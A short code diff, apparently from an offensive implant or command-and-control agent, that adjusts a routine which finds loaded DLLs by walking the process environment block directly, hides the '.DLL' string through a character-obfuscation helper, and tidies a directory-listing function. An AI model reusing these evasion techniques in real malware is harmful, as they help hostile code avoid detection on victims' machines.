@@ -176,12 +176,12 @@ PVOID LdrModuleSearch(
     Dll[ 2 ] = HideChar( 'L' );
     Dll[ 0 ] = HideChar( '.' );
 
-    Entry      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    Entry      = (PLDR_DATA_TABLE_ENTRY)Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
     FirstEntry = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
 
     StringCopyW( Name, ModuleName );
 
-    if ( ! EndsWithIW( ModuleName, Dll ) )
+    if ( ! StringEndWithW( ModuleName, Dll ) )
     {
         StringConcatW( Name, Dll );
     }
@@ -190,11 +190,11 @@ PVOID LdrModuleSearch(
 
     do
     {
-        if ( ! StringCompareIW( Name, Entry->BaseDllName.Buffer ) ) {
+        if ( ! StringNCompareIW( Name, Entry->BaseDllName.Buffer, StringLengthW(Name) ) ) {
             MemZero( Name, sizeof( Name ) );
             return Entry->DllBase;
         }
-        Entry = Entry->InLoadOrderLinks.Flink;
+        Entry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;
     } while ( Entry != FirstEntry );
 
     MemZero( Name, sizeof( Name ) );
@@ -1500,7 +1500,7 @@ PROOT_DIR listDir(
     PSUB_DIR         SubDir        = NULL;
     BOOL             IsDir         = FALSE;
     LPWSTR           Path          = NULL;
-    UINT32           PathSize      = NULL;
+    UINT32           PathSize      = 0;
     BOOL             Success       = FALSE;
 
     if ( ( ! StartPath ) || ( FilesOnly && DirsOnly ) ) {
